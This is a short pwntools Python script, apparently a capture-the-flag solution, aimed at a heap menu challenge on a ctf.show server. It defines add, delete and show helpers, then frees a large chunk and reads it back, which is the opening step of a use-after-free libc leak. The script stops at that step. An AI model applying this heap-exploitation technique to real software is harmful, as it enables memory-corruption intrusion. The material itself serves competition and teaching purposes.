from pwn import *
context(arch = 'amd64',os = 'linux',log_level = 'debug')
#io = process("./pwn")
io = remote('pwn.challenge.ctf.show',28188)
elf = ELF("./pwn")
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
menu = "Input your choice:"
def add(size, content):
    io.recvuntil(menu)
    io.sendline('1')
    io.recvuntil("Please input the size of the flag\n")
    io.sendline(str(size))
    io.recvuntil("please input the flag name:\n")
    io.send(content)
    io.sendlineafter('idx:','aaaa')
def delete(index):
    io.recvuntil(menu)
    io.sendline('4')
    io.recvuntil("Please input the index:\n")
    io.sendline(str(index))
def show(index):
    io.recvuntil(menu)
    io.sendline('2')
    io.recvuntil("Please input the index:\n")
    io.sendline(str(index))
add(0x450, '0')
add(0x10, '1')
delete(0)
show(0)
